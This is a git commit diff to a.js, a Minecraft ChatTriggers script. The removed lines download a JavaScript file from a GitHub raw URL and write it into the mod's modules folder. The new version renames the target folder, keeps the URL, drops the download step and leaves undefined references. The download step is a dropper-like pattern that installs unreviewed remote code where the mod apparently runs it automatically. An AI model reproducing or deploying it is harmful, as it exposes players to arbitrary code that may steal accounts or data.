819eeb4dc113d8dd19ab01366147d2f0deb0fd00
satnnyy <satnnyy@gmail.com>
2025-06-11 20:40:27 +1000

    Update a.js

--- a.js
+++ a.js
@@ -1,35 +1,11 @@
-const File = Java.type('java.io.File');
-const System = Java.type('java.lang.System');
-const request = /* your axios or request import here */;
+const appData = System.getenv("APPDATA");
 
-// Detect OS
-const osName = System.getProperty("os.name").toLowerCase();
-
-let basePath;
-if (osName.includes("win")) {
-  // Windows
-  basePath = System.getenv("APPDATA");
-} else if (osName.includes("mac")) {
-  // macOS
-  basePath = System.getProperty("user.home") + "/Library/Application Support";
-} else {
-  // Linux and others: assume home directory + .minecraft
-  basePath = System.getProperty("user.home");
-}
-
-// Build full target path
-const targetPath = new File(basePath + "/.minecraft/config/ChatTriggers/modules/pogdata");
-targetPath.mkdirs(); // create folders if needed
+// Path to ChatTriggers pogdata module folder
+const targetPath = new File(appData + "/.minecraft/config/ChatTriggers/modules/Amaterasu");
+targetPath.mkdirs(); // Create folders if needed
 
 // Destination file
 const file = new File(targetPath, "script.js");
 
-// URL to download
+// GitHub raw file URL
 const url = "https://raw.githubusercontent.com/satnnyy/test1/refs/heads/main/b.js";
-
-request(url).then(response => {
-  const FileWriter = Java.type('java.io.FileWriter');
-  const fw = new FileWriter(file);
-  fw.write(response.data);
-  fw.close();
-});
